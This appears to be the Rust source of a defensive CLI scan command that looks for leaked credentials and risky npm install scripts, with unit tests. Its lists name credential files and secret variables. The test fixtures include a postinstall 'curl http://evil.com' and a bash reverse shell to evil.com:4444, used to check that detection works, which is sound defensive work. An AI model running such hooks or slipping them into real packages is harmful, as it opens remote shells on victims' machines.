//! `sanctum scan` — Scan for credential exposure and npm supply chain risks.

use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

use sanctum_sentinel::npm::scanner::{self, RiskLevel, ScanResult};
use sanctum_types::errors::CliError;

/// Known credential file patterns.
const CREDENTIAL_FILES: &[&str] = &[
    ".env",
    ".env.local",
    ".env.production",
    ".env.staging",
    ".env.development",
    ".npmrc",
    ".pypirc",
    ".docker/config.json",
    ".aws/credentials",
    "credentials.json",
    "service-account.json",
];

/// API key patterns (prefixes that identify specific services).
const API_KEY_PATTERNS: &[(&str, &str)] = &[
    ("AKIA", "AWS Access Key ID"),
    ("AIza", "Google API Key"),
    ("gh_", "GitHub Token (classic)"),
    ("ghp_", "GitHub Personal Access Token"),
    ("gho_", "GitHub OAuth Token"),
    ("ghs_", "GitHub Server Token"),
    ("ghr_", "GitHub Refresh Token"),
    ("sk-", "OpenAI / Stripe Secret Key"),
    ("pk_live_", "Stripe Publishable Key (live)"),
    ("pk_test_", "Stripe Publishable Key (test)"),
    ("sk_live_", "Stripe Secret Key (live)"),
    ("sk_test_", "Stripe Secret Key (test)"),
    ("xoxb-", "Slack Bot Token"),
    ("xoxp-", "Slack User Token"),
    ("xapp-", "Slack App Token"),
    ("SG.", "SendGrid API Key"),
    ("key-", "Mailgun API Key"),
    ("sq0csp-", "Square Access Token"),
    ("sqOatp-", "Square OAuth Token"),
    ("sk-ant-", "Anthropic API Key"),
];

/// Environment variable names that commonly hold secrets.
const SECRET_ENV_VARS: &[&str] = &[
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "DATABASE_URL",
    "DB_PASSWORD",
    "REDIS_URL",
    "MONGODB_URI",
    "SECRET_KEY",
    "JWT_SECRET",
    "API_KEY",
    "API_SECRET",
    "PRIVATE_KEY",
    "ENCRYPTION_KEY",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "GITHUB_TOKEN",
    "SLACK_TOKEN",
    "STRIPE_SECRET_KEY",
    "SENDGRID_API_KEY",
    "TWILIO_AUTH_TOKEN",
    "DATADOG_API_KEY",
    "DATADOG_APP_KEY",
    "AZURE_STORAGE_KEY",
];

/// A scan finding.
struct Finding {
    file: PathBuf,
    line_number: usize,
    kind: String,
    detail: String,
    remediation: String,
}

/// Run the scan command.
///
/// When `npm` is `true`, scans for npm supply chain risks instead of (or in
/// addition to) credential exposure. The `npm_path` overrides the directory
/// to walk for `package.json` files. `npm_depth` controls how many
/// `node_modules` levels deep to descend (default 2).
pub fn run(
    json: bool,
    npm: bool,
    npm_path: Option<PathBuf>,
    npm_depth: usize,
) -> Result<(), CliError> {
    if npm {
        return run_npm_scan(json, npm_path, npm_depth);
    }

    let cwd = std::env::current_dir()?;

    if !json {
        #[allow(clippy::print_stdout)]
        {
            println!("Scanning {} for credential exposure...", cwd.display());
        }
    }

    let mut findings = Vec::new();

    // Check for credential files
    scan_credential_files(&cwd, &mut findings);

    // Check .env files for secrets
    scan_env_files(&cwd, &mut findings);

    // Check source files for API key patterns
    scan_source_files(&cwd, &mut findings);

    // Check .gitignore coverage
    scan_gitignore(&cwd, &mut findings);

    if json {
        #[allow(clippy::print_stdout)]
        {
            for finding in &findings {
                let obj = serde_json::json!({
                    "file": finding.file.display().to_string(),
                    "line": finding.line_number,
                    "kind": finding.kind,
                    "detail": finding.detail,
                    "remediation": finding.remediation,
                });
                let line = serde_json::to_string(&obj).unwrap_or_else(|_| "{}".to_string());
                println!("{line}");
            }
            let summary = serde_json::json!({
                "summary": true,
                "total_findings": findings.len(),
                "ok": findings.is_empty(),
            });
            let summary_line = serde_json::to_string(&summary).unwrap_or_else(|_| "{}".to_string());
            println!("{summary_line}");
        }
    } else {
        #[allow(clippy::print_stdout)]
        {
            if findings.is_empty() {
                println!("No credential exposure issues found.");
            } else {
                println!();
                println!("Found {} issue(s):", findings.len());
                println!("{:-<72}", "");
                for (i, finding) in findings.iter().enumerate() {
                    println!();
                    println!("  [{}/{}] {}", i + 1, findings.len(), finding.kind);
                    println!(
                        "    File: {}:{}",
                        finding.file.display(),
                        finding.line_number
                    );
                    println!("    Detail: {}", finding.detail);
                    println!("    Fix: {}", finding.remediation);
                }
                println!();
            }
        }

        if !findings.is_empty() {
            #[allow(clippy::print_stderr)]
            {
                eprintln!(
                    "Run `sanctum fix list` to see active threats, or `sanctum audit` for the full event log."
                );
            }
        }
    }

    if findings.is_empty() {
        Ok(())
    } else {
        Err(CliError::ScanFindings(findings.len()))
    }
}

// ============================================================
// npm supply chain scanning
// ============================================================

/// Aggregate counters for npm scan results.
struct NpmSummary {
    packages_scanned: usize,
    total_findings: usize,
    critical_count: usize,
    high_count: usize,
    medium_count: usize,
    has_high_or_above: bool,
}

/// Run the npm supply chain scan.
fn run_npm_scan(
    json: bool,
    npm_path: Option<PathBuf>,
    max_depth: usize,
) -> Result<(), CliError> {
    let root = match npm_path {
        Some(p) => p,
        None => std::env::current_dir()?,
    };

    if !json {
        #[allow(clippy::print_stdout)]
        {
            println!(
                "Scanning {} for npm supply chain risks (depth={max_depth})...",
                root.display()
            );
        }
    }

    // Discover package.json files
    let package_dirs = discover_package_jsons(&root, max_depth);
    let results: Vec<ScanResult> = package_dirs
        .iter()
        .map(|dir| scanner::scan_package(dir))
        .collect();

    let summary = aggregate_npm_results(&results);

    if json {
        output_npm_json(&results, &summary);
    } else {
        output_npm_human(&results, &summary);
    }

    if summary.has_high_or_above {
        Err(CliError::ScanFindings(summary.total_findings))
    } else {
        Ok(())
    }
}

/// Walk the filesystem from `root` looking for directories that contain
/// `package.json`. Respects `max_depth` for nested `node_modules` to avoid
/// scanning deeply into transitive dependencies.
fn discover_package_jsons(root: &Path, max_depth: usize) -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    walk_for_packages(root, &mut dirs, 0, max_depth, 0);
    dirs
}

/// Recursive walker for package discovery.
///
/// - `nm_depth` tracks how many `node_modules` boundaries we've crossed.
/// - `fs_depth` tracks the overall filesystem recursion depth for safety.
fn walk_for_packages(
    dir: &Path,
    out: &mut Vec<PathBuf>,
    nm_depth: usize,
    max_nm_depth: usize,
    fs_depth: usize,
) {
    const MAX_FS_DEPTH: usize = 100;
    if fs_depth >= MAX_FS_DEPTH {
        return;
    }

    // If this directory contains a package.json, record it
    if dir.join("package.json").is_file() {
        out.push(dir.to_path_buf());
    }

    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();

        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };

        // Skip hidden directories and common non-relevant dirs
        if name.starts_with('.') || name == "target" || name == "__pycache__" || name == "venv" {
            continue;
        }

        // Use symlink_metadata to avoid following symlinks
        let Ok(metadata) = path.symlink_metadata() else {
            continue;
        };

        if !metadata.is_dir() || metadata.file_type().is_symlink() {
            continue;
        }

        if name == "node_modules" {
            // Check if we've exceeded our node_modules depth
            if nm_depth >= max_nm_depth {
                continue;
            }
            walk_for_packages(&path, out, nm_depth + 1, max_nm_depth, fs_depth + 1);
        } else {
            walk_for_packages(&path, out, nm_depth, max_nm_depth, fs_depth + 1);
        }
    }
}

/// Aggregate results from multiple package scans.
fn aggregate_npm_results(results: &[ScanResult]) -> NpmSummary {
    let mut summary = NpmSummary {
        packages_scanned: results.len(),
        total_findings: 0,
        critical_count: 0,
        high_count: 0,
        medium_count: 0,
        has_high_or_above: false,
    };

    for result in results {
        summary.total_findings += result.findings.len();
        for finding in &result.findings {
            match finding.level {
                RiskLevel::Critical => summary.critical_count += 1,
                RiskLevel::High => summary.high_count += 1,
                RiskLevel::Medium => summary.medium_count += 1,
                RiskLevel::Low => {}
            }
        }
        if result.risk >= RiskLevel::High {
            summary.has_high_or_above = true;
        }
    }

    summary
}

/// Output npm scan results as NDJSON.
fn output_npm_json(results: &[ScanResult], summary: &NpmSummary) {
    #[allow(clippy::print_stdout)]
    {
        for result in results {
            for finding in &result.findings {
                let obj = serde_json::json!({
                    "type": "npm",
                    "package_dir": result.package_dir.display().to_string(),
                    "risk": result.risk.to_string(),
                    "source": finding.source,
                    "pattern": finding.pattern,
                    "level": finding.level.to_string(),
                });
                let line = serde_json::to_string(&obj).unwrap_or_else(|_| "{}".to_string());
                println!("{line}");
            }
            // Emit warnings as separate entries
            for warning in &result.warnings {
                let obj = serde_json::json!({
                    "type": "npm_warning",
                    "package_dir": result.package_dir.display().to_string(),
                    "warning": warning,
                });
                let line = serde_json::to_string(&obj).unwrap_or_else(|_| "{}".to_string());
                println!("{line}");
            }
        }
        let sum = serde_json::json!({
            "summary": true,
            "type": "npm",
            "packages_scanned": summary.packages_scanned,
            "total_findings": summary.total_findings,
            "critical": summary.critical_count,
            "high": summary.high_count,
            "medium": summary.medium_count,
            "ok": !summary.has_high_or_above,
        });
        let line = serde_json::to_string(&sum).unwrap_or_else(|_| "{}".to_string());
        println!("{line}");
    }
}

/// Output npm scan results in human-readable format.
fn output_npm_human(results: &[ScanResult], summary: &NpmSummary) {
    #[allow(clippy::print_stdout)]
    {
        if summary.total_findings == 0 {
            println!(
                "No npm supply chain risks found ({} packages scanned).",
                summary.packages_scanned
            );
        } else {
            println!();
            for result in results {
                if result.findings.is_empty() && result.warnings.is_empty() {
                    continue;
                }
                println!(
                    "  Package: {} [risk: {}]",
                    result.package_dir.display(),
                    result.risk
                );
                for finding in &result.findings {
                    println!("    [{level}] {source}: {pattern}",
                        level = finding.level,
                        source = finding.source,
                        pattern = finding.pattern,
                    );
                }
                for warning in &result.warnings {
                    println!("    [warn] {warning}");
                }
                println!();
            }
            println!(
                "{} packages scanned, {} findings ({} critical, {} high)",
                summary.packages_scanned,
                summary.total_findings,
                summary.critical_count,
                summary.high_count
            );
        }
    }
}

fn scan_credential_files(dir: &Path, findings: &mut Vec<Finding>) {
    for pattern in CREDENTIAL_FILES {
        let path = dir.join(pattern);
        if path.exists() && path.is_file() {
            // Check if it's tracked by git
            let is_tracked = std::process::Command::new("git")
                .args(["ls-files", "--error-unmatch", pattern])
                .current_dir(dir)
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false);

            if is_tracked {
                findings.push(Finding {
                    file: path,
                    line_number: 0,
                    kind: "Credential file tracked by git".to_string(),
                    detail: format!("{pattern} is committed to the repository"),
                    remediation: format!(
                        "Add '{pattern}' to .gitignore and run `git rm --cached {pattern}`"
                    ),
                });
            }
        }
    }
}

fn scan_env_files(dir: &Path, findings: &mut Vec<Finding>) {
    let env_patterns = [
        ".env",
        ".env.local",
        ".env.production",
        ".env.staging",
        ".env.development",
    ];

    for pattern in &env_patterns {
        let path = dir.join(pattern);
        if !path.exists() || !path.is_file() {
            continue;
        }

        // Skip .env files larger than 1MB
        if let Ok(meta) = fs::metadata(&path) {
            if meta.len() > 1024 * 1024 {
                continue;
            }
        }

        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };

        for (line_num, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            // Check for secret env var patterns
            for &var_name in SECRET_ENV_VARS {
                if trimmed.starts_with(var_name) && trimmed.contains('=') {
                    let value = trimmed.split_once('=').map_or("", |x| x.1);
                    let value = value.trim().trim_matches('"').trim_matches('\'');

                    // Skip empty values, placeholders, and references
                    if !value.is_empty()
                        && !value.starts_with("${")
                        && !value.starts_with("$(")
                        && value != "changeme"
                        && value != "your-key-here"
                        && value.len() > 3
                    {
                        findings.push(Finding {
                            file: path.clone(),
                            line_number: line_num + 1,
                            kind: "Plaintext secret in .env file".to_string(),
                            detail: format!("{var_name} contains a value ({} chars)", value.len()),
                            remediation:
                                "Use a secrets manager or environment variables at runtime"
                                    .to_string(),
                        });
                    }
                    break;
                }
            }

            // Check for API key patterns in values
            if let Some(value) = trimmed.split_once('=').map(|x| x.1) {
                let value = value.trim().trim_matches('"').trim_matches('\'');
                for &(prefix, service) in API_KEY_PATTERNS {
                    if value.starts_with(prefix) {
                        findings.push(Finding {
                            file: path.clone(),
                            line_number: line_num + 1,
                            kind: format!("{service} key detected"),
                            detail: format!("Value starts with '{prefix}' (likely a {service})"),
                            remediation:
                                "Use a secrets manager or environment variables at runtime"
                                    .to_string(),
                        });
                        break;
                    }
                }
            }
        }
    }
}

fn scan_source_files(dir: &Path, findings: &mut Vec<Finding>) {
    let extensions: HashSet<&str> = [
        "py", "js", "ts", "jsx", "tsx", "rs", "go", "java", "rb", "php", "yaml", "yml", "toml",
        "json", "xml", "tf", "hcl",
    ]
    .iter()
    .copied()
    .collect();

    walk_dir(
        dir,
        &mut |path: &Path| {
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if !extensions.contains(ext) {
                return;
            }

            // Skip files larger than 2MB to avoid excessive memory use
            if let Ok(meta) = fs::metadata(path) {
                if meta.len() > 2 * 1024 * 1024 {
                    return;
                }
            }

            let Ok(content) = fs::read_to_string(path) else {
                return;
            };

            for (line_num, line) in content.lines().enumerate() {
                for &(prefix, service) in API_KEY_PATTERNS {
                    if line.contains(prefix) {
                        // Avoid flagging comments that discuss patterns
                        let trimmed = line.trim();
                        if trimmed.starts_with("//")
                            || trimmed.starts_with('#')
                            || trimmed.starts_with("/*")
                            || trimmed.starts_with('*')
                        {
                            continue;
                        }

                        findings.push(Finding {
                            file: path.to_path_buf(),
                            line_number: line_num + 1,
                            kind: format!("Possible {service} in source code"),
                            detail: format!("Line contains '{prefix}...' pattern"),
                            remediation: "Move to environment variable or secrets manager"
                                .to_string(),
                        });
                        break;
                    }
                }
            }
        },
        0,
    );
}

fn scan_gitignore(dir: &Path, findings: &mut Vec<Finding>) {
    let gitignore_path = dir.join(".gitignore");
    if !gitignore_path.exists() {
        // If .env exists but no .gitignore, flag it
        if dir.join(".env").exists() {
            findings.push(Finding {
                file: gitignore_path,
                line_number: 0,
                kind: "Missing .gitignore".to_string(),
                detail: ".env file exists but no .gitignore found".to_string(),
                remediation: "Create a .gitignore with '.env' entry".to_string(),
            });
        }
        return;
    }

    let Ok(content) = fs::read_to_string(&gitignore_path) else {
        return;
    };

    let patterns_to_check = [".env", ".env.*", "*.pem", "*.key", "credentials.json"];

    for pattern in &patterns_to_check {
        let path = dir.join(pattern.replace("*.", "test.").replace('*', "test"));
        let has_files = if pattern.contains('*') {
            // For wildcard patterns, check if any matching files exist
            dir.join(".env.local").exists() || dir.join(".env.production").exists()
        } else {
            dir.join(pattern).exists()
        };

        if has_files
            && !content.lines().any(|l| {
                let trimmed = l.trim();
                trimmed == *pattern || trimmed.starts_with(pattern)
            })
        {
            findings.push(Finding {
                file: gitignore_path.clone(),
                line_number: 0,
                kind: "Missing .gitignore entry".to_string(),
                detail: format!("'{pattern}' should be in .gitignore"),
                remediation: format!("Add '{pattern}' to .gitignore"),
            });
        }

        let _ = path; // suppress unused warning
    }
}

fn walk_dir(dir: &Path, callback: &mut dyn FnMut(&Path), depth: usize) {
    const MAX_DEPTH: usize = 50;
    if depth >= MAX_DEPTH {
        return;
    }

    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();

        // Skip hidden directories, node_modules, target, .git, etc.
        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
            if name.starts_with('.')
                || name == "node_modules"
                || name == "target"
                || name == "__pycache__"
                || name == "venv"
                || name == ".venv"
                || name == "vendor"
            {
                continue;
            }
        }

        // Use symlink_metadata to avoid following symlinks
        let Ok(metadata) = path.symlink_metadata() else {
            continue;
        };

        if metadata.is_dir() {
            // Only recurse into real directories, NOT symlinks
            if !metadata.file_type().is_symlink() {
                walk_dir(&path, callback, depth + 1);
            }
        } else if metadata.is_file() {
            callback(&path);
        }
    }
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    #[test]
    fn finding_json_has_expected_fields() {
        let finding = Finding {
            file: PathBuf::from("/tmp/project/.env"),
            line_number: 3,
            kind: "Plaintext secret in .env file".to_string(),
            detail: "AWS_SECRET_ACCESS_KEY contains a value (40 chars)".to_string(),
            remediation: "Use a secrets manager or environment variables at runtime".to_string(),
        };

        let obj = serde_json::json!({
            "file": finding.file.display().to_string(),
            "line": finding.line_number,
            "kind": finding.kind,
            "detail": finding.detail,
            "remediation": finding.remediation,
        });

        let json_str = serde_json::to_string(&obj).expect("should serialise to JSON");

        // Parse back to validate it's valid JSON with expected fields
        let parsed: serde_json::Value =
            serde_json::from_str(&json_str).expect("should be valid JSON");
        assert_eq!(
            parsed.get("file").and_then(|v| v.as_str()),
            Some("/tmp/project/.env")
        );
        assert_eq!(
            parsed.get("line").and_then(serde_json::Value::as_u64),
            Some(3)
        );
        assert_eq!(
            parsed.get("kind").and_then(|v| v.as_str()),
            Some("Plaintext secret in .env file")
        );
        assert!(parsed.get("detail").is_some());
        assert!(parsed.get("remediation").is_some());
    }

    #[test]
    fn walk_dir_respects_depth_limit() {
        let dir = tempfile::tempdir().expect("tempdir");
        // Create a deeply nested directory structure (60+ levels)
        let mut current = dir.path().to_path_buf();
        for i in 0..60 {
            current = current.join(format!("level{i}"));
            fs::create_dir_all(&current).expect("create nested dir");
        }
        // Place a file at the deepest level
        fs::write(current.join("deep.txt"), "deep").expect("write deep file");

        let count = AtomicUsize::new(0);
        walk_dir(
            dir.path(),
            &mut |_path: &Path| {
                count.fetch_add(1, Ordering::Relaxed);
            },
            0,
        );

        // The file at depth 60 should NOT be found (MAX_DEPTH is 50)
        assert_eq!(
            count.load(Ordering::Relaxed),
            0,
            "file beyond MAX_DEPTH should not be visited"
        );
    }

    #[cfg(unix)]
    #[test]
    fn walk_dir_skips_symlink_directories() {
        use std::os::unix::fs as unix_fs;

        let dir = tempfile::tempdir().expect("tempdir");
        let dir_a = dir.path().join("dir_a");
        let dir_b = dir.path().join("dir_b");
        fs::create_dir_all(&dir_a).expect("create dir_a");
        fs::create_dir_all(&dir_b).expect("create dir_b");

        // Create a symlink loop: dir_a/link_to_b -> dir_b, dir_b/link_to_a -> dir_a
        unix_fs::symlink(&dir_b, dir_a.join("link_to_b")).expect("symlink a->b");
        unix_fs::symlink(&dir_a, dir_b.join("link_to_a")).expect("symlink b->a");

        // Place a real file in dir_a
        fs::write(dir_a.join("real.txt"), "real").expect("write file");

        let count = AtomicUsize::new(0);
        walk_dir(
            dir.path(),
            &mut |_path: &Path| {
                count.fetch_add(1, Ordering::Relaxed);
            },
            0,
        );

        // Should find the real file but not hang following symlinks
        assert_eq!(
            count.load(Ordering::Relaxed),
            1,
            "should find exactly the real file"
        );
    }

    // ================================================================
    // npm scan tests
    // ================================================================

    #[test]
    fn discover_package_jsons_finds_root_package() {
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(
            dir.path().join("package.json"),
            r#"{"name": "test-root", "scripts": {}}"#,
        )
        .expect("write package.json");

        let dirs = discover_package_jsons(dir.path(), 2);
        assert_eq!(dirs.len(), 1);
        assert_eq!(dirs[0], dir.path());
    }

    #[test]
    fn discover_package_jsons_finds_nested_node_modules() {
        let dir = tempfile::tempdir().expect("tempdir");
        // root/package.json
        fs::write(
            dir.path().join("package.json"),
            r#"{"name": "root"}"#,
        )
        .expect("write");

        // root/node_modules/evil-pkg/package.json
        let evil_dir = dir.path().join("node_modules").join("evil-pkg");
        fs::create_dir_all(&evil_dir).expect("mkdir");
        fs::write(
            evil_dir.join("package.json"),
            r#"{"name": "evil-pkg", "scripts": {"postinstall": "curl http://evil.com"}}"#,
        )
        .expect("write");

        let dirs = discover_package_jsons(dir.path(), 2);
        assert_eq!(dirs.len(), 2);
    }

    #[test]
    fn discover_package_jsons_respects_depth_limit() {
        let dir = tempfile::tempdir().expect("tempdir");
        // root/package.json
        fs::write(dir.path().join("package.json"), r#"{"name": "root"}"#)
            .expect("write");

        // Create nested node_modules (3 levels deep)
        // Level 1: root/node_modules/a/package.json
        let a_dir = dir.path().join("node_modules").join("a");
        fs::create_dir_all(&a_dir).expect("mkdir");
        fs::write(a_dir.join("package.json"), r#"{"name": "a"}"#).expect("write");

        // Level 2: root/node_modules/a/node_modules/b/package.json
        let b_dir = a_dir.join("node_modules").join("b");
        fs::create_dir_all(&b_dir).expect("mkdir");
        fs::write(b_dir.join("package.json"), r#"{"name": "b"}"#).expect("write");

        // Level 3: root/node_modules/a/node_modules/b/node_modules/c/package.json
        let c_dir = b_dir.join("node_modules").join("c");
        fs::create_dir_all(&c_dir).expect("mkdir");
        fs::write(c_dir.join("package.json"), r#"{"name": "c"}"#).expect("write");

        // With depth=1, should NOT find level 2 and 3
        let dirs = discover_package_jsons(dir.path(), 1);
        assert_eq!(dirs.len(), 2, "depth=1 should find root + 1 nm level");

        // With depth=2, should find root + level 1 + level 2
        let dirs = discover_package_jsons(dir.path(), 2);
        assert_eq!(dirs.len(), 3, "depth=2 should find root + 2 nm levels");
    }

    #[test]
    fn aggregate_npm_results_counts_risk_levels() {
        let results = vec![
            ScanResult {
                package_dir: PathBuf::from("/a"),
                risk: RiskLevel::Low,
                findings: vec![],
                warnings: vec![],
            },
            ScanResult {
                package_dir: PathBuf::from("/b"),
                risk: RiskLevel::Critical,
                findings: vec![
                    scanner::Finding {
                        source: "scripts.postinstall".to_string(),
                        pattern: "reverse shell".to_string(),
                        level: RiskLevel::Critical,
                    },
                    scanner::Finding {
                        source: "scripts.postinstall".to_string(),
                        pattern: "network access".to_string(),
                        level: RiskLevel::High,
                    },
                ],
                warnings: vec![],
            },
        ];

        let summary = aggregate_npm_results(&results);
        assert_eq!(summary.packages_scanned, 2);
        assert_eq!(summary.total_findings, 2);
        assert_eq!(summary.critical_count, 1);
        assert_eq!(summary.high_count, 1);
        assert!(summary.has_high_or_above);
    }

    #[test]
    fn aggregate_npm_results_no_findings_is_ok() {
        let results = vec![ScanResult {
            package_dir: PathBuf::from("/clean"),
            risk: RiskLevel::Low,
            findings: vec![],
            warnings: vec![],
        }];

        let summary = aggregate_npm_results(&results);
        assert!(!summary.has_high_or_above);
        assert_eq!(summary.total_findings, 0);
    }

    #[test]
    fn npm_scan_detects_malicious_package() {
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "evil-pkg",
                "scripts": {
                    "postinstall": "bash -i >& /dev/tcp/evil.com/4444 0>&1"
                }
            }"#,
        )
        .expect("write");

        let dirs = discover_package_jsons(dir.path(), 2);
        let results: Vec<ScanResult> = dirs
            .iter()
            .map(|d| scanner::scan_package(d))
            .collect();

        assert_eq!(results.len(), 1);
        assert!(results[0].risk >= RiskLevel::High);
        assert!(!results[0].findings.is_empty());
    }

    #[test]
    fn npm_scan_clean_package_exits_ok() {
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(
            dir.path().join("package.json"),
            r#"{"name": "clean-pkg", "scripts": {"test": "echo hello"}}"#,
        )
        .expect("write");

        let dirs = discover_package_jsons(dir.path(), 2);
        let results: Vec<ScanResult> = dirs
            .iter()
            .map(|d| scanner::scan_package(d))
            .collect();
        let summary = aggregate_npm_results(&results);

        assert!(!summary.has_high_or_above);
    }

    #[test]
    fn npm_json_output_has_expected_fields() {
        let result = ScanResult {
            package_dir: PathBuf::from("/test/pkg"),
            risk: RiskLevel::High,
            findings: vec![scanner::Finding {
                source: "scripts.postinstall".to_string(),
                pattern: "exec() call".to_string(),
                level: RiskLevel::High,
            }],
            warnings: vec!["oversized file".to_string()],
        };

        // Build the JSON object the same way the output function does
        let finding = &result.findings[0];
        let obj = serde_json::json!({
            "type": "npm",
            "package_dir": result.package_dir.display().to_string(),
            "risk": result.risk.to_string(),
            "source": finding.source,
            "pattern": finding.pattern,
            "level": finding.level.to_string(),
        });
        let json_str = serde_json::to_string(&obj).expect("serialise");
        let parsed: serde_json::Value =
            serde_json::from_str(&json_str).expect("parse");

        assert_eq!(parsed.get("type").and_then(|v| v.as_str()), Some("npm"));
        assert_eq!(
            parsed.get("package_dir").and_then(|v| v.as_str()),
            Some("/test/pkg")
        );
        assert_eq!(
            parsed.get("level").and_then(|v| v.as_str()),
            Some("high")
        );
        assert!(parsed.get("source").is_some());
        assert!(parsed.get("pattern").is_some());
    }

    #[test]
    fn npm_json_summary_has_expected_fields() {
        let summary = NpmSummary {
            packages_scanned: 5,
            total_findings: 3,
            critical_count: 1,
            high_count: 2,
            medium_count: 0,
            has_high_or_above: true,
        };

        let obj = serde_json::json!({
            "summary": true,
            "type": "npm",
            "packages_scanned": summary.packages_scanned,
            "total_findings": summary.total_findings,
            "critical": summary.critical_count,
            "high": summary.high_count,
            "medium": summary.medium_count,
            "ok": !summary.has_high_or_above,
        });
        let json_str = serde_json::to_string(&obj).expect("serialise");
        let parsed: serde_json::Value =
            serde_json::from_str(&json_str).expect("parse");

        assert_eq!(
            parsed.get("packages_scanned").and_then(serde_json::Value::as_u64),
            Some(5)
        );
        assert_eq!(
            parsed.get("ok").and_then(serde_json::Value::as_bool),
            Some(false)
        );
    }

    #[test]
    fn discover_skips_hidden_dirs() {
        let dir = tempfile::tempdir().expect("tempdir");
        let hidden = dir.path().join(".hidden-dir");
        fs::create_dir_all(&hidden).expect("mkdir");
        fs::write(hidden.join("package.json"), r#"{"name": "hidden"}"#).expect("write");

        let dirs = discover_package_jsons(dir.path(), 2);
        assert!(dirs.is_empty(), "should skip hidden directories");
    }
}
